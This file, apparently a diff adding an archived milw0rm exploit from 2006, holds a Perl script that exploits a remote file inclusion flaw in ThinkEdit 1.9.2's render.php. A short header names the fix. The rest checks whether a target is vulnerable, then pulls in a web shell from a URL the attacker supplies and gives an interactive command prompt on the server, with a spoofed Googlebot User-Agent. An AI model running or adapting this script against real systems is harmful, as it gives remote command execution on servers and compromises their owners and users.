@@ -1,0 +1,108 @@
+#################################################################################################
+#                                    r0ut3r Presents...                                         #
+#                                                                                               #
+#                                Another r0ut3r discovery!                                      #
+#                                  writ3r [at] gmail.com                                        #
+#                                                                                               #
+#                         ThinkEdit Remote File Inclusion Exploit                               #
+#################################################################################################
+# Software: ThinkEdit 1.9.2                                                                     #
+#                                                                                               #
+# Vendor: http://www.thinkedit.org/                                                             #
+#                                                                                               #
+# Released: 2006/12/08                                                                          #
+#                                                                                               #
+# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
+#                                                                                               #
+# Note: The information provided in this document is for ThinkEdit administrator                #
+# testing purposes only!                                                                        #
+#                                                                                               #
+# Solution:                                                                                     #
+# Add the below code to the top of render.php                                                   #
+# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #
+#    die();                                                                                     #
+#                                                                                               #
+# Exploit:                                                                                      #
+# perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd                           #
+#                                                                                               #
+# design/thinkedit/render.php?template_file=                                                    #
+#################################################################################################
+
+############################################################################
+#                  Remote File Inclusion Exploiter                         #
+#                                                                          #
+# This script attempts to exploit a remote file include vulnerability      #
+# by inserting a web shell into an include statement. A shell is then      #
+# spawned.                                                                 #
+#                                                                          #
+# Created By r0ut3r (writ3r [at] gmail.com)                                #
+############################################################################
+
+use IO::Socket;
+
+$port = "80"; # connection port
+$target = @ARGV[0]; # localhost
+$folder = @ARGV[1]; # /think/
+$shellloc = @ARGV[2]; # http://localhost/cmd.txt
+$cmdv = @ARGV[3]; # cmd
+$vulnerable = false;
+$s = true;
+
+sub Header()
+{
+	print q {Remote File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com)
+-------------------------------------------------------------------
+};
+}
+
+sub Usage()
+{
+	print q
+	{
+Usage: think.pl [target] [directory] [shell_loc] [cmd_variable]
+perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd
+};
+	exit();
+}
+
+Header();
+
+if (!$target || !$folder || !$shellloc || !$cmdv) {
+	Usage(); }
+
+if ($s eq false) { print "[-] Shell not found\n"; exit(); }
+
+# Check if the script is vulnerable and register_globals are on (if needed)
+$vulnc = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
+print $vulnc "GET ".$folder."render.php?template_file=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n";
+print $vulnc "Host: $target\n";
+print $vulnc "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
+print $vulnc "Accept: text/html\n";
+print $vulnc "Connection: keep-alive\n\n";
+
+while (<$vulnc>) {
+	if (/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/) { $vulnerable = true; }
+}
+
+if ($vulnerable eq false) { print "[-] Target not vulnerable, or register_globals could be off\n"; exit(); }
+
+print "[+] Starting shell\n";
+print "[cmd]\$ ";
+$cmd = <STDIN>;
+$cmd =~ s/ /%20/g;
+while ($cmd !~ "exit")
+{
+	$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
+	print $xpack "GET ".$folder."render.php?template_file=".$shellloc."&".$cmdv."=".substr($cmd, 0, -1)." HTTP/1.1\n";
+	print $xpack "Host: $target\n";
+	print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
+	print $xpack "Accept: text/html\n";
+	print $xpack "Connection: keep-alive\n\n";
+
+	print "[cmd]\$ ";
+	$cmd = <STDIN>;
+}
+
+print "[!] Connection to host lost...\n";
+
+# milw0rm.com [2006-12-08]
